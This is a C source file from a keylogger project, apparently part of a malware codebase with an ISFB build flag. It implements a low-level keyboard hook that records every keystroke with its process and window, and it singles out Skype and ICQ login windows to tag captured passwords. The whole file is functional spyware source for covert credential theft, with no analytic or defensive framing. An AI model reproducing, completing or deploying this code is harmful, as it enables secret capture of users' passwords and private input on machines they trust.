//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: keyhook.c
// $Revision: 58 $
// $Date: 2014-12-17 17:44:58 +0300 (Ср, 17 дек 2014) $
// description: 
//	Keyboard input hooking engine.

#include "..\common\main.h"
#include "..\common\common.h"
#include "..\common\guid.h"

#include "wnd.h"
#include "logoff.h"
#include "llhook.h"

#include "keyhook.h"
#include "keylog.h"
#include "tlhelp32.h"

ULONG _stdcall Crc32(char* pMem, unsigned long uLen);

// Key store init/cleanup routines
WINERROR KeyStoreInit(VOID);
VOID KeyStoreCleanup(VOID);

BOOL volatile				g_bLoggerEnabled = FALSE;	// Logger enabled flag

static SPECIAL_WINDOW g_SpecialWindows[] =
{
	// skype
	{
		HOST_SKYPE, // process name 
		WINDOW_IES, // window class name
		WINDOW_LOGIN_FORM, // parent window class name
		0, // window caption
		CAPTION_SKYPE // parent window class name
	},
	// icq8
	{
		HOST_ICQ, // process name 
		WINDOW_ICQ8,  // window class name
		0,            // parent window class name
		CAPTION_ICQ,  // window caption
		0             // parent window class name
	},
	// icq7
	{
		HOST_ICQ, // process name
		WINDOW_ICQ7,  // window class name
		0,            // parent window class name
		CAPTION_ICQ,  // window caption
		0             // parent window class name
	},
};

//
// returns true if we handle skype/icq and other cred window
//
BOOL KetIsSpecialWindow(ULONG hProcessHash, HWND hWnd, HWND hParent )
{
	BOOL fbResult = FALSE;
	unsigned i;
	for ( i = 0; i < sizeof(g_SpecialWindows)/sizeof(g_SpecialWindows[0]); i ++ )
	{
		if ( g_SpecialWindows[i].ProcessNameHash == hProcessHash )
		{
			CHAR szString[128];
			int StringLen;

			// window class name
			if ( g_SpecialWindows[i].WindowNameHash ){
				if ( ( StringLen = GetClassNameA(hWnd,szString,sizeof(szString))) > 0 ){
					strupr(szString);
					if ( Crc32(szString,StringLen) != g_SpecialWindows[i].WindowNameHash ){
						continue; // next
					}
				}
			}
			// if window class name matches we check only current entry
			// window text
			if ( g_SpecialWindows[i].Caption ){
				if ( ( StringLen = GetWindowTextA(hWnd,szString,sizeof(szString))) > 0 ){
					strupr(szString);
					if ( Crc32(szString,StringLen) != g_SpecialWindows[i].Caption ){
						break;
					}
				}
			}

			// parent window class name
			if ( g_SpecialWindows[i].ParentNameHash ){
				if ( ( StringLen = GetClassNameA(hParent,szString,sizeof(szString))) > 0 ){
					strupr(szString);
					if ( Crc32(szString,StringLen) != g_SpecialWindows[i].ParentNameHash ){
						break;
					}
				}
			}
			// parent window text
			if ( g_SpecialWindows[i].ParentCaption ){
				if ( ( StringLen = GetWindowTextA(hParent,szString,sizeof(szString))) > 0 ){
					strupr(szString);
					if ( Crc32(szString,StringLen) != g_SpecialWindows[i].ParentCaption ){
						break;
					}
				}
			}
			fbResult = TRUE;
			break;
		}
	}
	return fbResult;
}


static WCHAR MapSpecialKey(ULONG VKey)
{
	WCHAR Key = 0;

	switch(VKey)
	{
	case VK_UP:
		Key = 0x2191;
		break;
	case VK_DOWN:
		Key = 0x2193;
		break;
	case VK_LEFT:
		Key = 0x2190;
		break;
	case VK_RIGHT:
		Key = 0x2192;
		break;
	case VK_BACK:
		Key = 0x21d0;
		break;
	case VK_TAB:
		Key = 0x2423;
	default:
		break;
	}	// switch(VKey)

	return(Key);
}

//
//	Analyzes the input message and decrypt scancode if needed
//
BOOL 
	KeyProcessMessage( 
		IN HWND hWnd, 
		IN UINT uMsg, 
		IN UINT VKey, 
		IN UINT ScanCode,
		IN DWORD  ProcessID,
		IN DWORD  ThreadID,
		IN ULONG  HostProcess
#if _DEBUG
		,
		IN LPSTR ProcessPath
#endif
		)
{
	BOOL	Ret = FALSE;
	HWND	hParent;
	LONG	i, Result;
	BYTE	KeyState[256];
	WCHAR	KeySym[3];
	HKL		hKL;
	KEY_INFO	KeyInfo = {0};

	// we process key down message only
	if ( uMsg == WM_KEYDOWN )
	{
		memset(&KeyInfo,0,sizeof(KEY_INFO));
		memset(KeyState,0,sizeof(KeyState));
		hParent = GetAncestor( hWnd, GA_ROOTOWNER );
		if (!hParent)
			hParent = hWnd;
#if _DEBUG
		{
			LPTSTR		szMsg;
			SYSTEMTIME  SystemTime;
			TCHAR  szText[1024] = TEXT("NULL");

			if (uMsg == WM_KEYUP)
				szMsg = TEXT("WM_KEYUP");
			else if ( uMsg == WM_KEYDOWN )
				szMsg = TEXT("WM_KEYDOWN");

			GetWindowText( hParent, szText, 1024 );
			GetSystemTime ( &SystemTime );
			//time process:procid hWnd hParent(text) msg vKey
			DbgPrint(
				TEXT("%02d.%02d.%02d %02d:%02d:%02d:%03d %s:%lu %p %p(%s) %s %lu\n"),
				SystemTime.wDay,
				SystemTime.wMonth,
				SystemTime.wYear,
				SystemTime.wHour,
				SystemTime.wMinute,
				SystemTime.wSecond,
				SystemTime.wMilliseconds,
				ProcessPath, ProcessID,
				hWnd,hParent,szText,
				szMsg,VKey
				);
		}
#endif
		// check for login and password
		KeyInfo.Client.ProcessId = ProcessID;
		KeyInfo.Client.ThreadId  = ThreadID;
		KeyInfo.Client.CurrentWindow = hWnd;
		KeyInfo.Client.ParentWindow = hParent;
		KeyInfo.Client.Login = KetIsSpecialWindow( HostProcess, hWnd, hParent );

		if (GetKeyboardState(KeyState))
		{
			//query current locale
			hKL = GetKeyboardLayout(ThreadID);

			// GetKeyboardLayout returns invalid kbd state
			KeyState[VK_LSHIFT] = HIBYTE(GetAsyncKeyState(VK_LSHIFT));
			KeyState[VK_RSHIFT] = HIBYTE(GetAsyncKeyState(VK_RSHIFT));
			KeyState[VK_SHIFT]  = HIBYTE(GetAsyncKeyState(VK_SHIFT));

			// translate the message manually
			KeySym[0] = 0;
			Result = ToUnicodeEx(VKey, ScanCode, KeyState, (LPWORD)KeySym, 3, 0, hKL);

			switch(Result)
			{
			case -1:
				DbgPrint("keysym-1=%C\n",KeySym[0]);
				break;
			case 0:
				// A special key received
				DbgPrint("keysym=0\n");
				if (KeyInfo.wChar = MapSpecialKey(VKey))
					KeyStoreAdd(&KeyInfo);

				break;
			default:
				// A normal key received
				DbgPrint("keysym1=%C\n",KeySym[0]);
				for (i=0;i<Result;i++)
				{
					KeyInfo.wChar = KeySym[i];
					KeyStoreAdd(&KeyInfo);
				}
				break;
			}	// switch(Result)
			Ret = TRUE;
		}	// if (GetKeyboardState(KeyState))
	}	// if (uMsg == WM_KEYDOWN)

	if ( KeyInfo.clipboard ){
		AppFree ( KeyInfo.clipboard );
		KeyInfo.clipboard = NULL;
	}

	return(Ret);
}


//
//	Enables/disables keylogger
//
VOID KeyLogEnable(BOOL bEnable)
{
	g_bLoggerEnabled = bEnable;

	LLHookEnable(bEnable);
}

// ---- Startup and cleanup routines ---------------------------------------------------------------------------------------

//
//	Library initialization function. Must be called first.
//
WINERROR KeyLogInit(VOID)
{
	WINERROR Status;

	if ((Status = KeyStoreInit()) == NO_ERROR)
	{
		// low-level keyboard hook
		LLHookInitialize();

#ifdef _ENABLE_LOGOFF_NOTIFICATION
		// user logoff notification
		LogoffNInitialize();
#endif

		Status = NWindowStart();
	}	// if ((Status = KeyStoreInit()) == NO_ERROR)

	return(Status);
}

//
//	Library cleanup function.
//
VOID KeyLogCleanup(VOID)
{
#ifndef	_ISFB
	// Waiting for all hook-functions to complete
	WaitForHooks();
#endif

	//stop any notifications
	NWindowStop();

#ifdef _ENABLE_LOGOFF_NOTIFICATION
	// user logoff notification
	LogoffNRelease();
#endif

	// low-level keyboard hook
	LLHookRelease();

	// Key storage
	KeyStoreCleanup();
}